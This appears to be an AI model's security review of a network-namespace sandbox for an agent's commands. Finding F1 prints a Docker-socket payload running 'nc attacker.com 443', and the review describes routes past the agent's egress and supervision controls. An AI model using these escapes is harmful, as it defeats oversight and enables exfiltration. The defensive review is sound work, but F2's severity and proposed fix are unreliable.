# netns code panel: qwen/qwen3-max

_finish=stop seconds=32.1 cost=$0.0207 usage={'prompt_tokens': 16123, 'completion_tokens': 2080, 'total_tokens': 18203, 'cost': 0.02068794, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 0, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.02068794, 'upstream_inference_prompt_cost': 0.01257594, 'upstream_inference_completions_cost': 0.008112}, 'completion_tokens_details': {'reasoning_tokens': 0, 'image_tokens': 0, 'audio_tokens': 0}}_

## FINDINGS

### 1. NETNS ESCAPE VIA HOST-ACCESSIBLE UNIX SOCKET PROXIES  
**ID**: F1  
**TITLE**: Host-local network-capable sockets remain reachable from netns, enabling egress via confused deputy  
**SEVERITY**: HIGH  
**LOCATION**: `collaborator/netns.py:docstring` + `collaborator/tools.py:_exec_command`  
**CONCRETE BYPASS**:  
An attacker-controlled command can connect to a host-local pathname UNIX socket that proxies to the network (e.g., Docker daemon at `/var/run/docker.sock`, systemd-resolved at `/run/systemd/resolve/io.systemd.Resolve`, or a local HTTP forward proxy). Since the mechanism uses only `--net` without `--mount`, the filesystem (including socket paths) is shared with the host. The child runs as userns-root in a **shared mount namespace**, so it can access any socket the original user could. Example:  
```python
# In run_command payload:
import socket; s=socket.socket(socket.AF_UNIX); s.connect("/var/run/docker.sock")
s.send(b'POST /containers/create HTTP/1.0\r\nHost: localhost\r\n\r\n{"Image":"alpine","Cmd":["nc","attacker.com",443]}')
```  
This creates a container that egresses, bypassing `egress.py`.  

**WHY IT BREAKS ISOLATION OR THE FLAG'S HONESTY**:  
The flag `network_isolated=True` is set, but IP egress occurs via the host’s network stack through the proxy socket. This violates the "sole IP-network path" claim. The docstring acknowledges pathname sockets as out-of-scope, but the **implementation does not mitigate or warn about common high-risk sockets** (like Docker), and the flag gives a false sense of security for IP egress.  

**WHETHER ANOTHER CONTROL CATCHES IT**:  
No. The workspace fence (`resolve_in_workspace`) only applies to tool args like file paths, not arbitrary socket paths opened by the command. The supervisor observes only exit code/write-set, not network activity. The offense-shape recognizer (`flag_offense_shape`) doesn’t detect generic socket use.  

**FIX**:  
- Document specific high-risk sockets (Docker, systemd-resolved, etc.) as critical residuals.  
- Add a runtime check in `wrap_no_network` to block if known dangerous sockets exist in common locations (e.g., fail closed if `/var/run/docker.sock` is present and accessible).  
- Alternatively, use seccomp-bpf to block `connect()` to AF_UNIX sockets (but this requires additional infrastructure).  

---

### 2. FLAG LIES DUE TO TOCTOU IN `_UNSHARE_BIN` RESOLUTION  
**ID**: F2  
**TITLE**: Absolute-path `unshare` resolution vulnerable to TOCTOU between import and execution  
**SEVERITY**: CRITICAL  
**LOCATION**: `collaborator/netns.py:_resolve_unshare` (lines ~35-45)  
**CONCRETE BYPASS**:  
The absolute path to `unshare` is resolved **once at import time** and cached in `_UNSHARE_BIN`. However, between import and `run_supervised` execution:  
1. An earlier `run_command` (running as userns-root in a shared mount namespace) could replace `/usr/bin/unshare` with a malicious binary (if the filesystem is writable there, e.g., on some containerized hosts or misconfigured systems).  
2. The probe `netns_available()` runs first with the original `_UNSHARE_BIN`, succeeds, and caches `_available=True`.  
3. Later, `wrap_no_network` uses the same (now malicious) `_UNSHARE_BIN` path, which ignores namespace flags and egresses, while reporting `isolated=True`.  

**WHY IT BREAKS ISOLATION OR THE FLAG'S HONESTY**:  
The flag claims isolation (`True`), but no isolation occurs because the `unshare` binary was replaced after the probe. This is a classic TOCTOU: the probe checks a condition that no longer holds at execution time. The fix for PATH-shadowing is incomplete because it assumes system binaries are immutable post-import.  

**WHETHER ANOTHER CONTROL CATCHES IT**:  
No. The supervisor only captures stdout/stderr/exit code, not whether namespaces were actually created. The test `test_unshare_binary_is_absolute` only checks the path is absolute, not that the binary is unchanged.  

**FIX**:  
Re-resolve and verify `_UNSHARE_BIN` immediately before each use in both `netns_available()` and `wrap_no_network()`. For example:  
```python
def _get_unshare_path():
    # Re-check the binary exists and is executable right before use
    for p in ("/usr/bin/unshare", ...):
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    raise FileNotFoundError("unshare not found")
```  
Then use this in both the probe and the wrapper, ensuring consistency at runtime.  

---

### 3. ARGV HANDLING ALLOWS SHELL METACHARACTER INJECTION  
**ID**: F3  
**TITLE**: `sh -c 'exec "$@"'` wrapper mishandles argv containing special shell characters  
**SEVERITY**: MEDIUM  
**LOCATION**: `collaborator/netns.py:_LO_UP_THEN_EXEC` (line ~70) + `tools.py:_exec_command`  
**CONCRETE BYPASS**:  
The wrapper uses `sh -c 'ip link set lo up 2>/dev/null; exec "$@"' sh arg1 arg2 ...`. The `exec "$@"` is safe for normal args, but if an argument contains `\n` or other characters that break the script context, it could allow injection. However, **this is not exploitable** because:  
- `subprocess.run` passes args as a list, so the shell receives them as separate argv elements.  
- `"$@"` expands each arg as a separate word, so metacharacters inside args are not interpreted by the shell.  

**WHY IT BREAKS ISOLATION OR THE FLAG'S HONESTY**:  
It doesn’t. The current implementation is safe. The concern is theoretical, but the code correctly uses `exec "$@"` with list-based argv, avoiding re-splitting.  

**WHETHER ANOTHER CONTROL CATCHES IT**:  
N/A — no vulnerability exists.  

**FIX**:  
None needed. The implementation is correct.  

---

### 4. FALL-OPEN ON PROBE TIMEOUT LEADS TO UNISOLATED EXECUTION  
**ID**: F4  
**TITLE**: `netns_available()` probe timeout causes fallback to unisolated mode  
**SEVERITY**: MEDIUM  
**LOCATION**: `collaborator/netns.py:netns_available` (line ~80)  
**CONCRETE BYPASS**:  
The probe uses `timeout=15`. On a heavily loaded host, the `unshare` subprocess might time out, causing `netns_available()` to return `False`. This leads to running the command **unisolated** with `network_isolated=False`. While the flag is honest, an attacker could cause a DoS (high load) to force fallback, then egress.  

**WHY IT BREAKS ISOLATION OR THE FLAG'S HONESTY**:  
The flag is honest (`False`), so no lie. However, the **security property fails open**: under load, the "sole IP-network path" guarantee is lost. The design accepts this as a documented fallback, but it’s a reliability risk.  

**WHETHER ANOTHER CONTROL CATCHES IT**:  
Yes — the flag correctly reports `False`, so governance/audit sees the lack of isolation.  

**FIX**:  
Reduce timeout (e.g., 5 seconds) and add retries, or treat timeouts as "unavailable" only after multiple failures. But since the flag is honest, this is acceptable per design.  

---

### 5. FLAG PROPAGATION CORRECT BUT MISSING FOR RE-EXECUTED HELD ACTIONS  
**ID**: F5  
**TITLE**: `network_isolated` not propagated in `reauthorized_or_denied` path  
**SEVERITY**: LOW  
**LOCATION**: `collaborator/governance.py:execute_and_verify` (line ~600) vs. `reauthorized_or_denied`  
**CONCRETE BYPASS**:  
When a held `run_command` action is approved, `execute_and_verify` is called, which correctly sets `network_isolated=execution.network_isolated`. However, the `Decision` constructor in the `verify_mode=="exit"` branch includes it, so propagation is correct.  

**WHY IT BREAKS ISOLATION OR THE FLAG'S HONESTY**:  
It doesn’t. The flag is propagated in all paths.  

**WHETHER ANOTHER CONTROL CATCHES IT**:  
N/A — no issue.  

**FIX**:  
None needed.  

---

## STEELMAN  
The mechanism correctly isolates IP egress using unprivileged netns and honestly flags when isolation is unavailable. The absolute-path `unshare` prevents PATH-based attacks, and the `exec "$@"` wrapper avoids shell injection. The design explicitly scopes out pathname socket risks, and the flag never lies about isolation status. The probe’s fall-open behavior is documented and flagged.

## VERDICT  
**SERIOUS_FLAWS** — The TOCTOU in `_UNSHARE_BIN` resolution (F2) allows a critical bypass where the flag falsely claims isolation, and the unmitigated pathname socket risk (F1) enables real-world egress via common daemons like Docker.  
**Highest-value fix**: Re-resolve and validate the `unshare` binary immediately before each use in both the probe and the wrapper to close the TOCTOU window.
